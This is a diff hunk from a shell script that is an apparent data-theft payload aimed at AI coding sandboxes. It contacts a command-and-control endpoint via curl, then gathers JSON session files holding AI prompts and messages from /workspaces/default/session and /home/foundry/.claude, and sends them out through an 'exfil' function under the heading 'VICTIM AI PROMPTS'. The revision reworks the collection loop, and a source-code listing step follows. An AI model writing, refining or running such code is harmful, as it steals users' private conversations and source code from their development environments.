@@ -24,20 +24,17 @@ curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
   "$C2_URL/c2/poll?id=$SANDBOX_ID" >/dev/null 2>&1
 
 # === 1. VICTIM AI PROMPTS ===
-PROMPTS=""
-for DIR in /workspaces/default/session /home/foundry/.claude; do
-  [ ! -d "$DIR" ] && continue
-  find "$DIR" -maxdepth 3 -name '*.json' 2>/dev/null | while read F; do
-    if grep -lqE '"prompt"|"messages"' "$F" 2>/dev/null; then
-      cat "$F" 2>/dev/null
-    fi
+PROMPT_DATA=""
+for F in /workspaces/default/session/.sbox-sessions/*.json; do
+  [ -f "$F" ] && PROMPT_DATA="${PROMPT_DATA}$(cat "$F" 2>/dev/null)"
+done
+if [ -z "$PROMPT_DATA" ]; then
+  for F in $(find /workspaces/default/session /home/foundry/.claude -maxdepth 3 -name '*.json' 2>/dev/null); do
+    grep -q '"prompt"' "$F" 2>/dev/null && PROMPT_DATA="${PROMPT_DATA}$(cat "$F" 2>/dev/null)"
   done
-done > /tmp/prompts.txt
-PROMPT_DATA=$(cat /tmp/prompts.txt 2>/dev/null)
-if [ -n "$PROMPT_DATA" ]; then
-  exfil "=== VICTIM AI PROMPTS ===
-$PROMPT_DATA"
 fi
+[ -n "$PROMPT_DATA" ] && exfil "=== VICTIM AI PROMPTS ===
+$PROMPT_DATA"
 
 # === 2. SOURCE CODE LISTING ===
 cd "$PROJDIR" 2>/dev/null
